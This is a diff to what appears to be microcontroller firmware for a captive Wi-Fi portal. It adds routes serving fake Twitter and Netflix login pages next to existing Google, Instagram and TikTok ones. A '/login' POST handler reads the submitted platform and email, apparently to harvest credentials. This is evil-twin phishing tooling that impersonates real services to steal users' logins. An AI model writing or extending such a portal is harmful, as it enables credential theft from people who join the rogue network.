@@ -129,6 +129,14 @@ static void handleTT() {
     httpServer.send_P(200, "text/html", html_tiktok);
 }
 
+static void handleTW() {
+    httpServer.send_P(200, "text/html", html_twitter);
+}
+
+static void handleNF() {
+    httpServer.send_P(200, "text/html", html_netflix);
+}
+
 static void handleLogin() {
     String platform = httpServer.arg("platform");
     String email    = httpServer.arg("email");
@@ -194,6 +202,8 @@ static bool startPortal(const String& ssid, int channel = 6) {
     httpServer.on("/gg", handleGG);
     httpServer.on("/ig", handleIG);
     httpServer.on("/tt", handleTT);
+    httpServer.on("/tw", handleTW);
+    httpServer.on("/nf", handleNF);
     httpServer.on("/login", HTTP_POST, handleLogin);
 
     httpServer.on("/generate_204",       handleCaptive);
